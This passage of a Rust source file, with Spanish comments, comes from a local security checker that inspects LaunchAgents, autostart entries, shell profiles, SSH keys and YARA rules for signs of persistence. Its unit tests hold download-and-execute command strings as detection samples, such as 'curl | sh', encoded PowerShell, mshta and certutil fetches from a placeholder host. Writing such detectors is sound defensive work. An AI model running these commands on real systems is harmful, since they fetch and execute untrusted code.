                        Some(e) if e != 0 => format!(" — cargado por launchd, ahora parado (último estado {e})"),
                        _ => " — cargado por launchd, ahora parado".to_string(),
                    },
                })
                .unwrap_or_default();
            let prueba = format!("{etiqueta} ({motivo}): {linea}{arranque}{cargado}");
            if grave.is_some() {
                graves.push(prueba);
            } else {
                leves.push(prueba);
            }
        }
    }

    if total == 0 {
        return Hallazgo::ok(
            id,
            titulo,
            "No hay ningún LaunchAgent en las carpetas de usuario ni del administrador.".into(),
            &fuente,
        );
    }
    if graves.is_empty() && leves.is_empty() {
        let cargados_txt = cargados
            .as_ref()
            .map(|c| format!(" launchd tiene {} trabajo(s) cargados.", c.len()))
            .unwrap_or_default();
        if sin_leer == 0 {
            return Hallazgo::ok(
                id,
                titulo,
                format!("{total} agente(s) en disco, ninguno con algo raro.{cargados_txt}"),
                &fuente,
            );
        }
        // Si algún plist no se pudo leer, decir «bien» sería mentir: no se sabe.
        return Hallazgo::con(
            id,
            titulo,
            Veredicto::Desconocido,
            format!(
                "{total} agente(s) en disco, pero {sin_leer} no se pudieron leer (plutil no devolvió JSON), así que no se puede decir que estén limpios.{cargados_txt}"
            ),
            &fuente,
        );
    }
    let (veredicto, lista) = if graves.is_empty() {
        (Veredicto::Aviso, &leves)
    } else {
        (Veredicto::Problema, &graves)
    };
    Hallazgo::con(
        id,
        titulo,
        veredicto,
        format!(
            "{} agente(s) con algo que conviene mirar. El primero: {}",
            graves.len() + leves.len(),
            lista[0]
        ),
        &fuente,
    )
    .remedio("Míralo con `plutil -p <fichero>.plist` para ver qué ejecuta y con `launchctl list | grep <etiqueta>` para ver si launchd lo tiene cargado. Si no reconoces el agente, quítalo de tu carpeta (o desactívalo desde «Optimización») y averigua de dónde salió.")
}

/* ── Windows: lo que arranca con tu sesión ────────────────────────────────── */

/// En Windows no hay unidades de usuario como las de systemd: lo que arranca con
/// tu sesión son las tareas programadas (arriba) y las claves `Run` del registro,
/// que ya lista `plataforma::autoarranque`. Se dice, en vez de fingir una
/// comprobación que no existe en ese sistema.
#[cfg(target_os = "windows")]
fn servicios_windows() -> Hallazgo {
    Hallazgo::con(
        "servicios-usuario",
        "Servicios de usuario",
        Veredicto::Desconocido,
        "No aplica: Windows no tiene servicios de usuario como los de systemd. Aquí lo que arranca con tu sesión son las claves `Run` del registro (se miran en «Programas que arrancan solos») y las tareas programadas (se miran arriba). Los servicios del sistema son otra cosa y no se revisan aquí.".into(),
        "no aplica en Windows",
    )
}

/// Programas que arrancan con la sesión y apuntan a un sitio donde nadie instala
/// nada: descargas, temporales o memoria compartida. En Windows, además, el valor
/// de una entrada `Run` es una línea de comandos entera (no solo una ruta), así
/// que se mira también con los patrones de ese sistema.
fn revisar_autostart() -> Hallazgo {
    let entradas = crate::plataforma::autoarranque::listar();
    let mut malas: Vec<String> = Vec::new();
    for e in &entradas {
        if ruta_sospechosa(&e.exec) {
            malas.push(format!("{} → {}", e.nombre, e.exec));
            continue;
        }
        if cfg!(target_os = "windows") {
            if let Some(motivo) = motivo_sospechoso_windows(&e.exec) {
                malas.push(format!("{} → {} ({motivo})", e.nombre, e.exec));
            }
        }
    }
    let fuente = "entradas de arranque de la sesión".to_string();
    if malas.is_empty() {
        return Hallazgo::ok(
            "autostart",
            "Programas que arrancan solos",
            format!("{} entrada(s), ninguna que apunte a descargas ni a temporales.", entradas.len()),
            &fuente,
        );
    }
    let que = if cfg!(target_os = "windows") {
        "que arrancan desde una carpeta de descargas o temporales, o con un comando que no pinta bien"
    } else {
        "que arrancan desde una carpeta de descargas o temporales"
    };
    Hallazgo::con(
        "autostart",
        "Programas que arrancan solos",
        Veredicto::Aviso,
        format!("{} entrada(s) {que}: {}", malas.len(), malas[0]),
        &fuente,
    )
    .remedio("Míralas en «Optimización» y desactiva lo que no hayas puesto tú.")
}

/// Los ficheros de arranque del shell de ESTE sistema, con la etiqueta que se
/// enseña en la prueba. En Linux y macOS son los del shell de siempre (bash, zsh
/// y fish); en Windows es PowerShell, que es el shell que hay allí.
fn perfiles_de_shell() -> Vec<(std::path::PathBuf, String)> {
    if cfg!(target_os = "windows") {
        // `Documents` puede estar redirigido (OneDrive), así que se pregunta al
        // sistema en vez de componer `%USERPROFILE%\Documents` a mano. Son los dos
        // sitios donde PowerShell busca el perfil del usuario: el de PowerShell 7
        // y el de Windows PowerShell.
        let docs = dirs::document_dir().unwrap_or_else(|| crate::plataforma::rutas().home.join("Documents"));
        ["PowerShell", "WindowsPowerShell"]
            .iter()
            .map(|carpeta| {
                (
                    docs.join(carpeta).join("Microsoft.PowerShell_profile.ps1"),
                    format!("{carpeta}\\Microsoft.PowerShell_profile.ps1"),
                )
            })
            .collect()
    } else {
        let home = crate::plataforma::rutas().home;
        [".bashrc", ".bash_profile", ".profile", ".zshrc", ".zprofile", ".config/fish/config.fish"]
            .iter()
            .map(|f| (home.join(f), (*f).to_string()))
            .collect()
    }
}

/// De dónde se leen los perfiles, para el `fuente` del hallazgo.
fn fuente_perfiles() -> String {
    if cfg!(target_os = "windows") {
        "%USERPROFILE%\\Documents\\PowerShell\\Microsoft.PowerShell_profile.ps1 y el de Windows PowerShell".to_string()
    } else {
        "~/.bashrc, ~/.zshrc…".to_string()
    }
}

/// Los ficheros que tu shell lee al abrir sesión: ahí es donde se cuela un
/// «descarga y ejecuta» que se repite en cada terminal.
fn revisar_rc() -> Hallazgo {
    let ficheros = perfiles_de_shell();
    let mut total = 0usize;
    let mut malos: Vec<String> = Vec::new();
    let mut fuente = String::new();
    for (p, etiqueta) in &ficheros {
        let Ok(t) = std::fs::read_to_string(p) else { continue };
        total += 1;
        for linea in t.lines() {
            let l = linea.trim();
            if l.starts_with('#') || l.is_empty() {
                continue;
            }
            // En PowerShell el comentario también empieza por `#`, y sus formas de
            // descargar y ejecutar (`IEX`, `DownloadString`) se buscan con los
            // patrones de Windows.
            let motivo = if cfg!(target_os = "windows") {
                motivo_sospechoso_windows(l)
            } else {
                motivo_sospechoso(l)
            };
            if let Some(motivo) = motivo {
                if fuente.is_empty() {
                    fuente = p.to_string_lossy().to_string();
                }
                malos.push(format!("{etiqueta}: {l} ({motivo})"));
            }
        }
    }
    if malos.is_empty() {
        return Hallazgo::ok(
            "rc",
            "Arranque de tu shell",
            format!("{total} fichero(s) de arranque, ninguno descarga y ejecuta."),
            &fuente_perfiles(),
        );
    }
    Hallazgo::con(
        "rc",
        "Arranque de tu shell",
        Veredicto::Aviso,
        format!("{} línea(s) que descargan y ejecutan: {}", malos.len(), malos[0]),
        &fuente,
    )
    .remedio("Ábrelo y mira esa línea. Instalar algo con `curl | sh` es común, pero solo debe estar si lo pusiste tú.")
}

/* ── SSH: cómo entran sin contraseña ──────────────────────────────────────── */

#[cfg(unix)]
fn permisos(modo: u32) -> String {
    format!("{:04o}", modo & 0o777)
}

fn revisar_ssh_permisos() -> Hallazgo {
    let ssh = crate::plataforma::rutas().home.join(".ssh");
    if !ssh.exists() {
        return Hallazgo::ok(
            "ssh-permisos",
            "Permisos de ~/.ssh",
            "No hay carpeta ~/.ssh en este equipo.".into(),
            "~/.ssh",
        );
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut problemas: Vec<String> = Vec::new();
        let dir_ok = std::fs::metadata(&ssh)
            .map(|m| m.permissions().mode() & 0o777 == 0o700)
            .unwrap_or(false);
        if !dir_ok {
            let m = std::fs::metadata(&ssh).map(|x| x.permissions().mode() & 0o777).unwrap_or(0);
            problemas.push(format!("~/.ssh está en {} (debería ser 0700)", permisos(m)));
        }
        for f in ["authorized_keys", "id_ed25519", "id_rsa"] {
            let p = ssh.join(f);
            if !p.is_file() {
                continue;
            }
            let m = std::fs::metadata(&p).map(|x| x.permissions().mode() & 0o777).unwrap_or(0);
            if m & 0o077 != 0 {
                problemas.push(format!("{f} está en {} (debería ser 0600)", permisos(m)));
            }
        }
        if problemas.is_empty() {
            return Hallazgo::ok(
                "ssh-permisos",
                "Permisos de ~/.ssh",
                "La carpeta es 0700 y las claves no son legibles por otros.".into(),
                "~/.ssh",
            );
        }
        return Hallazgo::con(
            "ssh-permisos",
            "Permisos de ~/.ssh",
            Veredicto::Aviso,
            problemas.join("; "),
            "~/.ssh",
        )
        .remedio("`chmod 700 ~/.ssh && chmod 600 ~/.ssh/*` (ssh se niega a usarlas si están abiertas, y otro usuario podría copiarlas).");
    }
    #[cfg(not(unix))]
    {
        // En Windows los permisos de una carpeta son listas de control de acceso
        // (ACL), no el 0700/0600 de Unix: esta comprobación NO APLICA. Se dice así
        // en vez de decir «bien», que sería afirmar algo que no se ha mirado.
        Hallazgo::con(
            "ssh-permisos",
            "Permisos de ~/.ssh",
            Veredicto::Desconocido,
            "No aplica: este sistema no usa los permisos POSIX (0700/0600), aquí los permisos son listas de control de acceso (ACL) y esta comprobación no las lee. Los permisos los pone OpenSSH al crear la carpeta; para revisarlos a mano: `icacls %USERPROFILE%\\.ssh`.".into(),
            "~/.ssh",
        )
    }
}

/// Cuántas llaves pueden entrar sin contraseña. No se puede saber si son tuyas,
/// así que se ENSEÑAN: una que no reconozcas es la señal.
fn revisar_ssh_llaves() -> Hallazgo {
    let p = crate::plataforma::rutas().home.join(".ssh").join("authorized_keys");
    let Ok(t) = std::fs::read_to_string(&p) else {
        return Hallazgo::ok(
            "ssh-llaves",
            "Llaves autorizadas (authorized_keys)",
            "No hay llaves autorizadas: nadie puede entrar sin contraseña.".into(),
            "~/.ssh/authorized_keys",
        );
    };
    let llaves = parsear_authorized_keys(&t);
    if llaves.is_empty() {
        return Hallazgo::ok(
            "ssh-llaves",
            "Llaves autorizadas (authorized_keys)",
            "El fichero existe pero no tiene ninguna llave.".into(),
            "~/.ssh/authorized_keys",
        );
    }
    Hallazgo::con(
        "ssh-llaves",
        "Llaves autorizadas (authorized_keys)",
        Veredicto::Aviso,
        format!(
            "{} llave(s) pueden entrar sin contraseña. La primera: {}",
            llaves.len(),
            llaves[0].1
        ),
        "~/.ssh/authorized_keys",
    )
    .remedio("Repásalas (`cat ~/.ssh/authorized_keys`). Una que no reconozcas es una puerta abierta: quítala y cambia las contraseñas.")
}

/// (tipo, comentario) de cada llave autorizada. La línea entera queda en el
/// comentario final, que es lo que un humano reconoce.
///
/// El TIPO se valida: sin eso, cualquier línea de dos palabras («no soy…») pasaba
/// por una llave y el recuento mentía.
pub fn parsear_authorized_keys(texto: &str) -> Vec<(String, String)> {
    const TIPOS: &[&str] = &["ssh-", "ecdsa-", "sk-ssh-", "sk-ecdsa-"];
    texto
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .filter_map(|l| {
            let mut partes = l.split_whitespace();
            let tipo = partes.next()?.to_string();
            if !TIPOS.iter().any(|t| tipo.starts_with(t)) {
                return None;
            }
            let _clave = partes.next()?;
            let resto: Vec<&str> = partes.collect();
            let etiqueta = if resto.is_empty() {
                "(sin comentario)".to_string()
            } else {
                resto.join(" ")
            };
            Some((tipo, etiqueta))
        })
        .collect()
}

/* ── YARA, si lo tienes instalado y con reglas tuyas ──────────────────────── */

/// Aplica las reglas YARA del usuario, si hay `yara` y hay reglas.
///
/// **No se baja ninguna regla de internet**: se usan las que el usuario haya
/// dejado en `~/.config/machinograph/yara/`. Se escanea una lista CORTA de sitios (los
/// que se ejecutan solos y las descargas), no el disco entero: `yara` sobre un home
/// completo tarda horas y no es lo que nadie quiere al abrir un panel.
fn revisar_yara() -> Hallazgo {
    let dir = crate::plataforma::rutas().config.join("machinograph").join("yara");
    // El temporal del sistema se pide a la capa de plataforma: en Linux es /tmp,
    // pero en macOS es /var/folders/... y en Windows %TEMP%, así que escribir /tmp
    // a mano dejaría la comprobación sin objetivos en esos dos.
    let temp = if cfg!(target_os = "linux") {
        "/tmp".to_string()
    } else {
        crate::plataforma::rutas().temp.to_string_lossy().to_string()
    };
    let reglas: Vec<std::path::PathBuf> = std::fs::read_dir(&dir)
        .map(|it| {
            it.flatten()
                .map(|e| e.path())
                .filter(|p| p.extension().map(|x| x == "yar" || x == "yara").unwrap_or(false))
                .collect()
        })
        .unwrap_or_default();

    if !existe("yara") {
        return Hallazgo::con(
            "yara",
            "Reglas YARA (opcional)",
            Veredicto::Desconocido,
            "`yara` no está instalado, así que no se aplican reglas. Machinograph NO baja reglas de internet a propósito: son tuyas y locales."
                .into(),
            "~/.config/machinograph/yara/",
        )
        .remedio(&format!("Si quieres usarlas: instala `yara` y deja tus ficheros `.yar` en ~/.config/machinograph/yara/. Los sitios que se escanean son ~/Descargas, {temp} y los ficheros de arranque."));
    }
    if reglas.is_empty() {
        return Hallazgo::con(
            "yara",
            "Reglas YARA (opcional)",
            Veredicto::Desconocido,
            "`yara` está instalado, pero no hay ninguna regla en ~/.config/machinograph/yara/.".into(),
            "~/.config/machinograph/yara/",
        )
        .remedio("Deja ahí tus ficheros `.yar` (por ejemplo, los de un repositorio público de reglas) y vuelve a comprobar.");
    }

    let home = crate::plataforma::rutas().home;
    let objetivos: Vec<String> = vec![
        home.join("Descargas").to_string_lossy().to_string(),
        home.join("Downloads").to_string_lossy().to_string(),
        temp.clone(),
    ];
    let mut coincidencias: Vec<String> = Vec::new();
    for regla in &reglas {
        let mut args: Vec<String> = vec![regla.to_string_lossy().to_string()];
        args.extend(objetivos.iter().cloned().filter(|o| std::path::Path::new(o).exists()));
        if args.len() < 2 {
            continue;
        }
        if let Ok(s) = crate::proceso::ejecutar("yara", &args, &[], std::time::Duration::from_secs(120)) {
            let texto = String::from_utf8_lossy(&s.stdout);
            for l in texto.lines().take(20) {
                if !l.trim().is_empty() {
                    coincidencias.push(l.trim().to_string());
                }
            }
        }
    }
    if coincidencias.is_empty() {
        return Hallazgo::ok(
            "yara",
            "Reglas YARA (opcional)",
            format!(
                "{} regla(s) tuyas aplicadas sobre las descargas, {temp} y los ficheros de arranque: sin coincidencias.",
                reglas.len()
            ),
            "~/.config/machinograph/yara/",
        );
    }
    Hallazgo::con(
        "yara",
        "Reglas YARA (opcional)",
        Veredicto::Problema,
        format!("{} coincidencia(s) con tus reglas: {}", coincidencias.len(), coincidencias[0]),
        "~/.config/machinograph/yara/",
    )
    .remedio("Mira el fichero que ha coincidido antes de borrar nada: una regla genérica puede señalar un falso positivo.")
}

/// ¿Está este programa en el PATH? En Windows un ejecutable lleva extensión
/// (`yara.exe` es `yara` para quien lo escribe en la terminal), así que además se
/// prueban las extensiones de `PATHEXT`.
fn existe(programa: &str) -> bool {
    let Some(path) = std::env::var_os("PATH") else { return false };
    std::env::split_paths(&path).any(|d| {
        if d.join(programa).is_file() {
            return true;
        }
        if cfg!(target_os = "windows") {
            let ext = std::env::var("PATHEXT").unwrap_or_else(|_| ".COM;.EXE;.BAT;.CMD".into());
            return ext
                .split(';')
                .filter(|e| !e.is_empty())
                .any(|e| d.join(format!("{programa}.{}", e.trim_start_matches('.'))).is_file());
        }
        false
    })
}

/// El veredicto de todo el chequeo, para poder resumirlo en una línea.
pub fn resumen(hallazgos: &[Hallazgo]) -> Veredicto {
    hallazgos
        .iter()
        .map(|h| h.veredicto)
        .fold(Veredicto::Ok, Hallazgo::peor)
}

#[cfg(test)]
mod pruebas {
    use super::*;

    #[test]
    fn reconoce_las_formas_de_descargar_y_ejecutar() {
        assert!(motivo_sospechoso("curl http://x.sh | sh").is_some());
        assert!(motivo_sospechoso("wget -qO- http://x | bash").is_some());
        assert!(motivo_sospechoso("echo aGVsbG8= | base64 -d | sh").is_some());
        assert!(motivo_sospechoso("/dev/shm/x --daemon").is_some());
        assert!(motivo_sospechoso("python -c 'import socket'").is_some());
        // Y lo normal NO se marca: si esto pitara, nadie miraría los avisos.
        assert!(motivo_sospechoso("/usr/bin/llama-swap --config /etc/swap.yaml").is_none());
        assert!(motivo_sospechoso("bash -lc 'export PATH=$PATH:/usr/local/bin'").is_none());
        assert!(motivo_sospechoso("# un comentario con curl dentro").is_none());
    }

    #[test]
    fn el_crontab_se_lee_sin_comentarios_ni_variables() {
        let texto = "# m h dom mon dow command\nSHELL=/bin/bash\n0 3 * * * /usr/bin/backup\n15 * * * * curl http://x | sh\n";
        let lineas = parsear_crontab(texto);
        assert_eq!(lineas.len(), 2);
        assert!(lineas[1].contains("curl"));
    }

    #[test]
    fn las_llaves_autorizadas_se_cuentan_con_su_etiqueta() {
        let texto = "# una llave\nssh-ed25519 AAAAC3Nza... usuario@portatil\nssh-rsa AAAAB3Nz... sin-comentario-real\n";
        let v = parsear_authorized_keys(texto);
        assert_eq!(v.len(), 2);
        assert_eq!(v[0].0, "ssh-ed25519");
        assert_eq!(v[0].1, "usuario@portatil");
        // Una línea sin comentario no deja el campo vacío: se dice que no lo tiene.
        assert_eq!(v[1].1, "sin-comentario-real");
        // Y una línea que no es una llave no se cuela.
        assert!(parsear_authorized_keys("no soy una llave\n").is_empty());
    }

    #[test]
    fn el_resumen_se_queda_con_lo_peor() {
        let ok = Hallazgo::ok("a", "a", String::new(), "");
        let aviso = Hallazgo::con("b", "b", Veredicto::Aviso, String::new(), "");
        let problema = Hallazgo::con("c", "c", Veredicto::Problema, String::new(), "");
        assert_eq!(resumen(&[ok.clone(), aviso.clone()]), Veredicto::Aviso);
        assert_eq!(resumen(&[aviso, problema.clone(), ok]), Veredicto::Problema);
        assert_eq!(resumen(&[]), Veredicto::Ok);
    }

    #[test]
    fn el_launchctl_list_se_lee_con_y_sin_cabecera() {
        // Lo que imprime `launchctl list` en macOS: tres columnas (PID, último
        // estado y etiqueta) y la cabecera que ponen las versiones modernas.
        let con = "PID\tStatus\tLabel\n-\t0\tcom.apple.Finder\n1234\t0\tcom.example.agente\n-\t-15\tcom.example.roto\n";
        let v = parsear_launchctl_list(con);
        assert_eq!(v.len(), 3, "la cabecera no puede colarse como un trabajo: {v:?}");
        assert_eq!(v[0].etiqueta, "com.apple.Finder");
        assert_eq!(v[0].pid, None);
        assert_eq!(v[1].pid, Some(1234));
        // Un estado negativo es la señal que lo mató: se conserva.
        assert_eq!(v[2].estado, Some(-15));
        // Y sin cabecera (versiones antiguas) se lee igual; una línea que no es una
        // fila del formato no se cuela.
        let sin = "-\t0\tcom.apple.Finder\nno soy una fila\n";
        let v = parsear_launchctl_list(sin);
        assert_eq!(v.len(), 1, "{v:?}");
        assert_eq!(v[0].etiqueta, "com.apple.Finder");
    }

    #[test]
    fn el_plist_se_lee_con_sus_argumentos_y_su_arranque() {
        // Formato real de `plutil -convert json -o - <fichero>.plist`.
        let json = r#"{"Label":"com.example.tarea","ProgramArguments":["/bin/sh","-c","curl http://x | sh"],"RunAtLoad":true}"#;
        let a = parsear_plist_agente(json).expect("debería leerse");
        assert_eq!(a.etiqueta.as_deref(), Some("com.example.tarea"));
        assert_eq!(a.argumentos, vec!["/bin/sh", "-c", "curl http://x | sh"]);
        assert!(a.run_at_load);
        assert!(!a.keep_alive);
        // Y ahí está el porqué de mirar TODOS los argumentos: el programa es un
        // `/bin/sh` que no dice nada, y el `curl | sh` va detrás.
        assert!(motivo_sospechoso(&a.argumentos.join(" ")).is_some());

        // `Program` (una sola cadena) y `KeepAlive` como diccionario de condiciones
        // (que significa que sí, que se mantiene vivo) se entienden igual.
        let json2 = r#"{"Label":"x","Program":"/usr/local/bin/daemon","KeepAlive":{"SuccessfulExit":false}}"#;
        let b = parsear_plist_agente(json2).unwrap();
        assert_eq!(b.argumentos, vec!["/usr/local/bin/daemon"]);
        assert!(b.keep_alive);
        assert!(!b.run_at_load);
        assert!(parsear_plist_agente(r#"{"Label":"y","KeepAlive":false}"#).is_some_and(|c| !c.keep_alive));

        // Un JSON que no es un plist no se cuela.
        assert!(parsear_plist_agente("[]").is_none());
        assert!(parsear_plist_agente("no soy json").is_none());
    }

    #[test]
    fn el_csv_de_schtasks_se_lee_por_nombre_de_columna() {
        // Formato de `schtasks /query /fo CSV /v`: primera fila con los nombres de
        // las columnas y todo entre comillas (una comilla literal va como `""`).
        let csv = concat!(
            "\"HostName\",\"TaskName\",\"Next Run Time\",\"Status\",\"Task To Run\",\"Scheduled Task State\",\"Schedule\"\n",
            "\"PC\",\"\\Microsoft\\Windows\\Defrag\\ScheduledDefrag\",\"N/A\",\"Ready\",\"%windir%\\system32\\defrag.exe -c\",\"Enabled\",\"Scheduling data is not available in this format.\"\n",
            "\"PC\",\"\\Actualizador\",\"N/A\",\"Ready\",\"powershell.exe -NoP -EncodedCommand SQBFAFgA\",\"Enabled\",\"At logon time\"\n",
            "\"PC\",\"\\Vieja\",\"N/A\",\"Disabled\",\"C:\\Users\\Public\\x.exe\",\"Disabled\",\"At logon time\"\n",
            "\"PC\",\"\\Descarga\",\"N/A\",\"Ready\",\"cmd.exe /c \"\"C:\\Users\\a\\Downloads\\a.bat\"\"\",\"Enabled\",\"Daily\"\n",
        );
        let t = parsear_schtasks_csv(csv).unwrap();
        assert_eq!(t.len(), 4, "{t:?}");
        assert_eq!(t[0].nombre, "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag");
        assert_eq!(t[0].programacion, "Scheduling data is not available in this format.");
        assert!(t[0].activa);
        // Una tarea desactivada no se ejecuta: se marca como tal y no se señala.
        assert!(!t[2].activa);
        // Las comillas escapadas del comando se leen bien.
        assert!(t[3].ejecutar.contains(r#"cmd.exe /c "C:\Users\a\Downloads\a.bat""#), "{:?}", t[3].ejecutar);
        // Y el veredicto de cada una: la del sistema no pinta mal; las otras sí.
        assert!(motivo_sospechoso_windows(&t[0].ejecutar).is_none());
        assert!(motivo_sospechoso_windows(&t[1].ejecutar).is_some());
        assert!(ruta_sospechosa_en("windows", &t[3].ejecutar));
        assert!(ruta_sospechosa_en("windows", &t[2].ejecutar));
    }

    #[test]
    fn si_la_cabecera_de_schtasks_no_se_entiende_se_dice_cual_fue() {
        // Un Windows en otro idioma traduce la cabecera de `schtasks`: se dice lo
        // que se vio en vez de adivinar qué columna es cuál (leer la equivocada
        // señalaría la tarea que no es).
        let e = parsear_schtasks_csv("\"Nombre de equipo\",\"Nombre de tarea\"\n\"PC\",\"x\"\n").unwrap_err();
        assert!(e.contains("TaskName"), "{e}");
        assert!(e.contains("Nombre de equipo"), "{e}");
    }

    #[test]
    fn el_csv_entiende_las_comillas_y_las_comas_de_dentro() {
        assert_eq!(
            campos_csv("\"a\",\"b,c\",\"d\"\"e\",sin comillas"),
            vec!["a", "b,c", "d\"e", "sin comillas"]
        );
    }

    #[test]
    fn los_patrones_de_windows_y_de_macos_son_los_suyos() {
        // Lo que en Windows es ejecutar sin escribir en disco.
        assert!(motivo_sospechoso_windows("powershell -enc SQBFAFgA").is_some());
        assert!(motivo_sospechoso_windows("powershell -WindowStyle Hidden -EncodedCommand x").is_some());
        assert!(motivo_sospechoso_windows(r"mshta http://x/y.hta").is_some());
        assert!(motivo_sospechoso_windows("cmd /c certutil -urlcache -f http://x y").is_some());
        // Y lo normal, no.
        assert!(motivo_sospechoso_windows(r"C:\Windows\System32\defrag.exe -c").is_none());
        assert!(motivo_sospechoso_windows(r"schtasks /run /tn MiTarea").is_none());
        // Las rutas sospechosas son las de cada sistema: `/tmp` lo es en Linux y en
        // macOS, y `%TEMP%`/`Users\Public` solo en Windows.
        assert!(ruta_sospechosa_en("linux", "/tmp/x"));
        assert!(ruta_sospechosa_en("macos", "/private/var/folders/ab/T/x"));
        assert!(ruta_sospechosa_en("macos", "/Users/Shared/x"));
        assert!(ruta_sospechosa_en("windows", r"C:\Users\a\AppData\Local\Temp\x.exe"));
        assert!(ruta_sospechosa_en("windows", r"C:\Users\Public\x.exe"));
        assert!(!ruta_sospechosa_en("windows", r"C:\Program Files\App\app.exe"));
        assert!(!ruta_sospechosa_en("linux", r"C:\Users\Public\x.exe"));
    }

    #[test]
    fn revisar_no_revienta_y_cada_hallazgo_trae_su_prueba() {
        let v = revisar();
        assert!(!v.is_empty());
        for h in &v {
            assert!(!h.titulo.is_empty(), "{h:?}");
            // Un hallazgo sin detalle no se puede comprobar, y este módulo promete
            // que cada uno lleva su prueba.
            assert!(!h.detalle.is_empty(), "{h:?}");
            assert!(!h.fuente.is_empty(), "{h:?}");
            // Y lo que va mal tiene que decir qué hacer.
            if h.veredicto == Veredicto::Problema {
                assert!(h.remedio.is_some(), "un problema sin remedio: {h:?}");
            }
        }
    }
}
